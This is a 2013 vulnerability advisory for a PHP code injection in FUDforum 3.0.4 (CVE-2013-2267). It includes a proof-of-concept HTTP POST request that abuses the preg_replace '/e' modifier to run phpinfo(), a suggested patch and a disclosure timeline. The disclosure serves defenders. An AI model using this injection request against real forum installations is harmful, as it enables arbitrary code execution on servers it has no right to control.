@@ -1,0 +1,105 @@
+id: 20605
+date: 04/04/2013
+title: FUDforum 3.0.4 Code Injection Vulnerability
+author: High-Tech Bridge
+cves: CVE-2013-2267
+
+Product: FUDforum
+Vendor: FUDforum
+Vulnerable Version(s): 3.0.4 and probably prior
+Tested Version: 3.0.4
+Vendor Notification: February 21, 2013 
+Vendor Patch: March 11, 2013 
+Public Disclosure: April 3, 2013 
+Vulnerability Type: Code Injection [CWE-94]
+CVE Reference: CVE-2013-2267
+Risk Level: High 
+CVSSv2 Base Score: 7.1 (AV:N/AC:H/Au:S/C:C/I:C/A:C)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered vulnerability in FUDforum, which can be exploited to execute arbitrary PHP code on the target system.
+
+
+1) PHP Code Injection in FUDforum: CVE-2013-2267
+
+The vulnerability exists due to insufficient validation of HTTP POST parameters "regex_str", "regex_str_opt" and "regex_with" in "/adm/admreplace.php" script before using them in the "preg_replace()" function. A remote administrator can send a specially crafted HTTP POST request, inject and execute arbitrary PHP code on the target system with privileges of the web server. 
+
+The following PoC (Proof of Concept) code executes the "phpinfo()" function:
+
+
+POST /adm/admreplace.php HTTP/1.1
+Host: fudforum
+Referer: http://fudforum/adm/admreplace.php?&SQ=8928823a5edf50cc642792c2fa4d8863
+Cookie: fud_session_1361275607=11703687e05757acb08bb3891f5b2f8d
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+
+SQ=8928823a5edf50cc642792c2fa4d8863&rpl_replace_opt=0&btn_submit=Add&btn_regex=1&edit=&regex_str=(.*)&regex_str_opt=e&regex_with=phpinfo()
+
+
+Successful exploitation of the vulnerability requires administrative privileges within the application.
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Official Vendor patch is available here:
+http://fudforum.svn.sourceforge.net/fudforum/?rev=5596&view=rev
+
+However, the above-mentioned patch does not entirely fix the vulnerability, which can still be exploited by other exploitation techniques (such as NULL-byte and others).
+
+High-Tech Bridge Security Research Lab developed the following patch to eliminate the vulnerability:
+
+--- admreplace.php.old    Mon Mar 04 15:46:02 2013
++++ admreplace.php    Tue Mar 26 02:51:59 2013
+@@ -18,9 +18,7 @@
+
+
+     if (!$_POST['rpl_replace_opt']) {
+-            if ($_POST['rpl_preg_opt'] == 'e') {    // Prevent code 
+injection.
+-            $_POST['rpl_preg_opt'] = 'i';
+-        }
++        if(false !== strpos($_POST['rpl_preg_opt'],'e')) { 
+$_POST['rpl_preg_opt'] = 'i'; }
+         $_POST['rpl_replace_str'] = '/'. $_POST['rpl_replace_str'] 
+.'/'. $_POST['rpl_preg_opt'];
+         $_POST['rpl_from_post'] = '/'. $_POST['rpl_from_post'] .'/'. 
+$_POST['rpl_from_post_opt'];
+     } else {
+@@ -184,7 +182,7 @@
+         if ($regex_str_opt == 'e') {
+             $str = 'Code injection is not allowed!';
+         } else {
+-            $str = preg_replace('/'. $regex_str .'/'. $regex_str_opt, 
+$regex_with, $regex_src);
++            $str = preg_replace('/'. preg_quote($regex_str) .'/'. 
+$regex_str_opt, $regex_with, $regex_src);
+
+Disclosure Timeline:
+2013-02-21: Vendor notification.
+2013-02-28: Secondary Vendor notification.
+2013-03-03: Vendor patch.
+2013-03-04: Vendor notification about patch bypasses.
+2013-03-26: Vendor received our patch that eliminates the vulnerability.
+2013-04-02: Still no modification of the official patch from the Vendor.
+2013-04-03: Public Disclosure [<a href="https://www.htbridge.com/advisory/disclosure_policy.html">Disclosure Policy</a>].
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23146 - https://www.htbridge.com/advisory/HTB23146 - PHP Code Injection in FUDforum.
+[2] FUDforum - http://fudforum.org - FUDforum (Fast Uncompromising Discussion Forum) is a free and open source web discussion forum released under the GPL (version 2) license that is written in PHP and can be used on virtually any operating system.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. 
+
+-----------------------------------------------------------------------------------------------
+
+#  0day.today [2023-03-27]  #
